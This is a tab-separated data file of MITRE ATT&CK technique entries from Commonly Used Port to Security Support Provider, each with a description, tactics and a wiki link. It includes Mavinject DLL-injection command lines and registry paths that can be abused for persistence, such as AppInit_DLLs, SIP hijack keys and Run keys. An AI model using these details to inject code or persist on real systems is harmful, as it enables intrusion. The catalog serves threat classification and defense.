T1043	Commonly Used Port	Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1043
T1042	Change Default File Association	When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under HKEY_CLASSES_ROOT\.[extension], for example HKEY_CLASSES_ROOT\.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\[handler]\shell\[action]\command. For example:\n*HKEY_CLASSES_ROOT\txtfile\shell\open\command\n*HKEY_CLASSES_ROOT\txtfile\shell\print\command\n*HKEY_CLASSES_ROOT\txtfile\shell\printto\command\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to execute arbitrary commands.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1042
T1210	Exploitation of Remote Services	Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\xa0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [[Technique/T1046|Network Service Scanning]] or other [[Discovery]] methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB and RDP as well as applications that may be used within internal networks such as MySQL and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [[Technique/T1068|Exploitation for Privilege Escalation]] as a result of lateral movement exploitation as well.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1210
T1211	Exploitation for Defense Evasion	Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\xa0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [[Technique/T1063|Security Software Discovery]]. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1211
T1218	Signed Binary Proxy Execution	Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.\n\nMavinject.exe\nMavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process.\n\n"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>\n\nC:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>\n\nSyncAppvPublishingServer.exe\nSyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe.\n\nSeveral others binaries exist that may be used to perform similar behavior.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1218
T1048	Exfiltration Over Alternative Protocol	Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1048
T1023	Shortcut Modification	Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [[Technique/T1036|Masquerading]] to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1023
T1149	LC_MAIN Hijacking	As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary\u2019s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD . The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn\u2019t know anything was different . By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1149
T1115	Clipboard Data	Adversaries may collect data stored in the Windows clipboard from users copying information within or between applications. \n\nWindows\n\nApplications can access clipboard data by using the Windows API. \n\nMac\n\nOSX provides a native command, pbpaste, to grab clipboard contents .	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1115
T1114	Email Collection	Adversaries may target user email to collect sensitive information from a target.\n\nFiles containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.\n\nAdversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.\n\nSome adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1114
T1117	Regsvr32	Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries.\n\nAdversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.\n\nRegsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments.\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish [[Persistence]] via [[Technique/T1122|Component Object Model Hijacking]].	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1117
T1116	Code Signing	Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries. The certificates used during an operation may be created, forged, or stolen by the adversary.\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1116
T1111	Two-Factor Authentication Interception	Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.\n\nIf a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.\n\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors.\n\nOther hardware tokens, such as RSA SecurID, require the adversary to have access to the physical device or the seed and algorithm in addition to the corresponding credentials.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1111
T1110	Brute Force	Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.\n\n[[Technique/T1003|Credential Dumping]] to obtain password hashes may only get an adversary so far when [[Technique/T1075|Pass the Hash]] is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table. Cracking hashes is usually done on adversary-controlled systems outside of the target network.\n\nAdversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nA related technique called password spraying uses one password, or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1110
T1113	Screen Capture	Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.\n\nMac\n\nOn OSX, the native command screencapture is used to capture screenshots.\n\nLinux\n\nOn Linux, there is the native command xwd.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1113
T1112	Modify Registry	Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in [[Persistence]] and [[Execution]].\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [[Software/S0075|Reg]] may be used for local or remote Registry modification. Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).\n\nThe Registry of a remote system may be modified to aid in execution of files as part of [[Lateral Movement]]. It requires the remote Registry service to be running on the target system. Often [[Technique/T1078|Valid Accounts]] are required, along with access to the remote system's [[Technique/T1077|Windows Admin Shares]] for RPC communication.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1112
T1029	Scheduled Transfer	Data exfiltration may be performed only at certain times of day or at certain intervals.  This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1029
T1119	Automated Collection	Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [[Technique/T1064|Scripting]] to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [[Technique/T1083|File and Directory Discovery]] and [[Technique/T1105|Remote File Copy]] to identify and move files.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1119
T1118	InstallUtil	InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. InstallUtil is located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe. InstallUtil.exe is digitally signed by Microsoft.\n\nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1118
T1143	Hidden Window	The configurations for how applications run on macOS and OS X are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window .	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1143
T1054	Indicator Blocking	An adversary may attempt to block indicators or events from leaving the host machine. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process or creating a host-based firewall rule to block traffic to a specific server.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1054
T1055	Process Injection	Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.\n\nWindows\n\nThere are multiple approaches to injecting code into a live process. Windows implementations include:\n* Dynamic-link library (DLL) injection involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.\n* Portable executable injection involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue.\n* Thread execution hijacking involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [[Technique/T1093|Process Hollowing]], the thread must first be suspended.\n* Asynchronous Procedure Call (APC) injection involves attaching malicious code to the APC Queue of a process's thread. Queued APC functions are executed when the thread enters an alterable state. AtomBombing  is a variation that utilizes APCs to invoke malicious code previously written to the global atom table.\n* Thread Local Storage (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point.\n\nMac and Linux\n\nImplementations for Linux and OS X/macOS systems include:\n*LD_PRELOAD, LD_LIBRARY_PATH (Linux), DYLD_INSERT_LIBRARIES (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process.\n*Ptrace system calls can be used to attach to a running process and modify it in runtime.\n*/proc/[pid]/mem provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity.\n*VDSO hijacking performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object.\n\nMalware commonly utilizes process injection to access system resources through which [[Persistence]] and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.	Defense Evasion, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1055
T1056	Input Capture	Adversaries can use methods of capturing user input for obtaining credentials for [[Technique/T1078|Valid Accounts]] and information [[Collection]] that include keylogging and user input field interception.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider.\n\nKeylogging is likely to be used to acquire credentials for new access opportunities when [[Technique/T1003|Credential Dumping]] efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.\n\nAdversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [[Technique/T1133|External Remote Services]] and [[Technique/T1078|Valid Accounts]] or as part of the initial compromise by exploitation of the externally facing web service.	Collection, Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1056
T1057	Process Discovery	Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.\n\nWindows\n\nAn example command that would obtain details on processes is "tasklist" using the [[Software/S0057|Tasklist]] utility.\n\nMac and Linux\n\nIn Mac and Linux, this is accomplished with the ps command.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1057
T1050	New Service	When operating systems boot up, they can start programs or applications called services that perform background system functions. A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. \n\nAdversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [[Technique/T1036|Masquerading]]. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [[Technique/T1035|Service Execution]].	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1050
T1198	SIP and Trust Provider Hijacking	In user mode, Windows Authenticode digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all ) and are identified by globally unique identifiers (GUIDs).\n\nSimilar to [[Technique/T1116|Code Signing]], adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by:\n* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value all files using that SIP (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID} that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the DLL and Function Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID} that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n*Note: The above hijacks are also possible without modifying the Registry via [[Technique/T1038|DLL Search Order Hijacking]].\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.	Defense Evasion, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1198
T1052	Exfiltration Over Physical Medium	In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1052
T1053	Scheduled Task	Utilities such as [[Software/S0110|at]] and [[Software/S0111|schtasks]], along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system.\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote [[Execution]] as part of [[Lateral Movement]], to gain SYSTEM privileges, or to run a process under the context of a specified account.	Execution, Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1053
T1195	Supply Chain Compromise	Supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage of the supply chain including:\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)\n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics  on specific victims.	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1195
T1194	Spearphishing via Service	Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1194
T1197	BITS Jobs	Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [[Technique/T1086|PowerShell]]  and the [[Software/S0190|BITSAdmin]] tool.\n\nAdversaries may abuse BITS to download, execute, and even clean up after malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also allow [[Persistence]] by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\n\nBITS upload functionalities can also be used to perform [[Technique/T1048|Exfiltration Over Alternative Protocol]].	Defense Evasion, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1197
T1196	Control Panel Items	Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.\n\nFor ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.\n\nAdversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [[Technique/T1193|Spearphishing Attachment]] campaigns  or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1196
T1191	CMSTP	The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. Similar to [[Technique/T1117|Regsvr32]] / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs  and/or COM scriptlets (SCT) from remote servers. This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.\n\nCMSTP.exe can also be abused to [[Technique/T1088|Bypass User Account Control]] and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1191
T1190	Exploit Public-Facing Application	The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services. Depending on the flaw being exploited this may include [[Technique/T1211|Exploitation for Defense Evasion]].\n\nFor websites and databases, the OWASP top 10 gives a good list of the top 10 most common web-based vulnerabilities.	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1190
T1193	Spearphishing Attachment	Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [[Technique/T1204|User Execution]] to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1193
T1192	Spearphishing Link	Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attachment malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [[Technique/T1204|User Execution]]. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons).	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1192
T1060	Registry Run Keys / Start Folder	Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. The program will be executed under the context of the user and will have the account\'s associated permissions level.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [[Technique/T1036|Masquerading]] to make the Registry entries look as if they are associated with legitimate programs.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1060
T1063	Security Software Discovery	Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules, anti-virus, and virtualization. These checks may be built into early-stage remote access tools.\n\nWindows\n\nExample commands that can be used to obtain security software information are [[Software/S0108|netsh]], reg query with [[Software/S0075|Reg]], dir with [[Software/S0106|cmd]], and [[Software/S0057|Tasklist]], but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\n\nMac\n\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1063
T1062	Hypervisor	A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. A type-1 hypervisor operates at a level below the operating system and could be designed with [[Technique/T1014|Rootkit]] functionality to hide its existence from the guest operating system. A malicious hypervisor of this nature could be used to persist on systems through interruption.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1062
T1102	Web Service	Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.\n\nThese commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).	Command and Control, Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1102
T1103	AppInit DLLs	Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. Similar to [[Technique/T1055|Process Injection]], these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1103
T1100	Web Shell	A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client).\n\nWeb shells may serve as [[Technique/T1108|Redundant Access]] or as a persistence mechanism in case an adversary's primary access methods are detected and removed.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1100
T1101	Security Support Provider	Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1101
